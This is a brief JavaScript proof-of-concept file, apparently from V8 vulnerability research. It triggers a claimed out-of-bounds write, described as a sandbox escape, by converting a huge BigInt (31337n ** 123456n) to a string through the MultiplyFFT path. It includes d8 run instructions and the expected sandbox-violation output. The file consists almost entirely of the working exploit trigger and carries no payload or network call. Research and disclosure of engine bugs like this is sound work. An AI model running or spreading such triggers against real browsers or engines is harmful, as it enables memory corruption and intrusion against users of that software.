// V8 Sandbox Escape PoC - via BigInt toString path
// ==============================================================================
//
// Alternative path to trigger the NormalizeAndRecombine OOB write
// through the BigInt toString conversion, which also calls MultiplyFFT.
//
// The toString path was used in the original 474041332 report.
//
// Build: Same as poc_sandbox_violation_v5.js
// Run:   ./d8 --sandbox-testing poc_sandbox_violation_tostring.js
// Expected: ## V8 sandbox violation detected!

// Create a large BigInt that triggers FFT when converted to string
const x = 123456n;
const a = 31337n ** x;

// toString triggers MultiplyFFT via ToStringImpl
// The intermediate Z buffer is allocated via new digit_t[] (with ASAN redzones)
const s = a.toString();

print("toString completed (if we get here, OOB was not triggered)");
